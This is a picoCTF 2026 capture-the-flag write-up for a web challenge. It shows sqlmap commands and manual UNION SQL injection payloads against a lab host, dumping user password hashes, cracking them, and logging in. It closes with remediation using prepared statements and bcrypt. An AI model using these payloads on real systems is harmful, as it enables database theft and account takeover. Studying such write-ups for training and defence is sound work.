# picoCTF 2026 — SQL Map 1 Writeup

**Category:** Web Exploitation  
**Points:** 300  
**Author:** Aditya Sudhansu  
**Flag:** `picoCTF{F0uNd_s3cr3T_K3y_f0R_w3_<>}`

---

## Challenge Description

> You've been hired by a shadowy group of pentesters who love a good puzzle. The system looks ordinary, but appearances lie. Somewhere inside, sloppy code and legacy hashing practices left a tiny, perfect doorway for an attacker. Your mission — should you choose to accept it — is to slip through that doorway, act as a legit user and retrieve the secret flag. Login here and find the flag!

**Target URL:** `http://lonely-island.picoctf.net:50015/`

---

## Hints Given

1. Search box looks interesting.
2. Passwords should not be stored in md5 format.
3. CrackStation is a great online tool for cracking hashes.
4. Sample SQLMap command: `sqlmap -u <URL_for_search> --cookie="PHPSESSID=1111111111111" -p <vulnerable_parameter> --batch --tables`

---

## Reconnaissance

### Step 1 — Explore the Login Page

Visiting the target URL revealed a standard login form (`login.php`) with username and password fields, plus a **Register** button linking to `register.php`.

The register page had a subtle but important hint in its subtitle:

> _"Remember your own password while cracking passwords."_

This strongly hinted that we would need to **crack password hashes** found in the database.

### Step 2 — Create a Test Account

To explore the application, we registered a test account:

- **Username:** `obito`
- **Password:** `pass`

After registration, we successfully logged in and were redirected to a **flag search page** at `vuln.php`.

---

## Discovery — Vulnerable Search Endpoint

### Step 3 — Identify the Attack Surface

After logging in, the application presented a search interface titled **"Vulnerable Flag Search - picoCTF2026"** at:

```
http://lonely-island.picoctf.net:50015/vuln.php
```

The page accepted a GET parameter `q` for searching flags. This was the injection point.

---

## Exploitation — SQL Injection

### Step 4 — Confirm SQL Injection

We first attempted automatic enumeration with SQLMap:

```bash
sqlmap -u "http://lonely-island.picoctf.net:50015/vuln.php?q=test" \
  --cookie="PHPSESSID=f4a48a88b28618162aef740535d1866d" \
  -p q --batch --tables
```

SQLMap confirmed the backend was **SQLite** and identified two injection types:

- **Boolean-based blind** — `SQLite AND boolean-based blind (JSON)`
- **Time-based blind** — `SQLite > 2.0 OR time-based blind (heavy query)`

However, the time-based technique caused the server to crash/timeout. We switched to boolean-only:

```bash
sqlmap ... --technique=B --threads=3 --hex
```

This still failed to retrieve table names automatically due to SQLite limitations with SQLMap's table enumeration.

### Step 5 — Manual UNION Injection

We switched to **manual UNION-based injection** directly in the browser.

**Find column count** — tried 2 columns:

```
/vuln.php?q=test' UNION SELECT name,1 FROM sqlite_master WHERE type='table'--
```

✅ This worked! Results showed **3 tables**:

|Table Name|
|---|
|`flags`|
|`sqlite_sequence`|
|`users`|

### Step 6 — Extract Users Table Schema

```
/vuln.php?q=test' UNION SELECT sql,1 FROM sqlite_master WHERE name='users'--
```

Result:

```sql
CREATE TABLE users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT NOT NULL UNIQUE,
  password TEXT NOT NULL
)
```

Columns confirmed: `id`, `username`, `password`

### Step 7 — Dump All Users and Password Hashes

```
/vuln.php?q=test' UNION SELECT username,password FROM users--
```

This returned all users and their **MD5 hashed passwords**:

|Username|MD5 Hash|
|---|---|
|admin|`5a9a79d9fa477ed163b89088681672c9`|
|ctf-player|`7a67ab5872843b22b5e14511867c4e43`|
|ghost|`8d2379c40704bed972e55680be2355e2`|
|malicious|`a669d60c31ad3d05b9e453c8576c7aab`|
|noaccess|`83806b490e28a7f8e6662646cbdbff1a`|
|obito|`1a1dc91c907325c69271ddf0c944bc72`|
|suspicious|`eb1f3ba6901c65d9b2e09a38f560758b`|

---

## Password Cracking

### Step 8 — Crack MD5 Hashes with CrackStation

We submitted all hashes to **[CrackStation](https://crackstation.net)**.

Results:

|Username|Hash|Cracked Password|
|---|---|---|
|admin|`5a9a79d9fa477ed163b89088681672c9`|❌ Not found|
|ctf-player|`7a67ab5872843b22b5e14511867c4e43`|✅ `dyesebel`|
|ghost|`8d2379c40704bed972e55680be2355e2`|❌ Not found|
|malicious|`a669d60c31ad3d05b9e453c8576c7aab`|❌ Not found|
|noaccess|`83806b490e28a7f8e6662646cbdbff1a`|❌ Not found|
|obito|`1a1dc91c907325c69271ddf0c944bc72`|✅ `pass`|
|suspicious|`eb1f3ba6901c65d9b2e09a38f560758b`|❌ Not found|

The key crack was **`ctf-player:dyesebel`**.

---

## Flag Retrieval

### Step 9 — Login as ctf-player

Using the cracked credentials:

- **Username:** `ctf-player`
- **Password:** `dyesebel`

After logging in, the application revealed a **protected area** displaying the flag:

```
picoCTF{F0uNd_s3cr3T_K3y_f0R_w3_<>}
```

---

## Attack Chain Summary

```
[1] Explore app → find register + login + vuln.php
        ↓
[2] Register account → gain access to search page
        ↓
[3] Test search param → UNION SQL injection confirmed
        ↓
[4] Enumerate sqlite_master → find 'users' table
        ↓
[5] Dump users table → get MD5 password hashes
        ↓
[6] Crack hashes on CrackStation → ctf-player:dyesebel
        ↓
[7] Login as ctf-player → FLAG retrieved ✅
```

---

## Vulnerability Analysis

### 1. SQL Injection (CWE-89)

The `vuln.php` search parameter `q` was directly concatenated into a SQL query without sanitization:

```php
// Vulnerable code (reconstructed)
$query = "SELECT name, value FROM flags WHERE name LIKE '%" . $_GET['q'] . "%'";
```

**Fix:** Use parameterized queries / prepared statements:

```php
$stmt = $db->prepare("SELECT name, value FROM flags WHERE name LIKE ?");
$stmt->bindValue(1, '%' . $q . '%', SQLITE3_TEXT);
$result = $stmt->execute();
```

### 2. Weak Password Hashing (CWE-916)

Passwords were stored as plain **MD5 hashes**, which are:

- Fast to compute → easy to brute force
- Vulnerable to rainbow table attacks (like CrackStation)

**Fix:** Use a proper password hashing algorithm:

```php
// Store
$hash = password_hash($password, PASSWORD_BCRYPT);

// Verify
password_verify($input, $hash);
```

---

## Tools Used

|Tool|Purpose|
|---|---|
|Browser DevTools|Page source inspection|
|SQLMap|Initial injection detection|
|Manual UNION injection|Table/data enumeration|
|CrackStation|MD5 hash cracking|

---

## Key Takeaways

- **Never store passwords as MD5** — use bcrypt, argon2, or scrypt
- **Always use parameterized queries** — never concatenate user input into SQL
- **Search endpoints are just as dangerous as login forms** — all user input must be sanitized
- **UNION-based injection** is powerful when error messages reveal column count mismatches
- **Manual injection beats automated tools** when the server is unstable under load

---

_Writeup by: obito | picoCTF 2026_
